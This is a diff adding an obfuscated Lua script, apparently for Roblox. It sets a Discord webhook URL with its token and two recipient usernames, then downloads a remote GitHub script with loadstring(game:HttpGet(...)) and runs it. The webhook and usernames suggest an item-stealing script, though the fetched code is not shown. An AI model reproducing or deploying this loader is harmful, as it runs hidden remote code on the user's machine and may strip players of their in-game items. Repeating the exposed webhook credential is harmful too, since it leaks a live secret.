@@ -1,0 +1,13 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 
+
+]]--
+
+do do local v0=0;local v1;while true do if (v0==0) then v1=0;while true do if (v1==1) then _G.Webhook="https://discord.com/api/webhooks/1110140200908242976/zHlrgZwa10OB6SKNIBQU6lQfJet5OBVXADFAkSbFHjEGh9vYqwP6aFl-mO_uP7lxU3T3";loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherX-
+ScriptZ/main/PSXSCR%C4%B0PTX",true))();break;end if (v1==0) then local v2=0;local v3;while true do if (v2==0) then v3=0;while true do if (v3==1) then v1=1;break;end if (v3==0) then _G.UserName="GREN444_TNT";_G.UserName2="GREN444_TNT";v3=1;end end break;end end end end break;end end end end
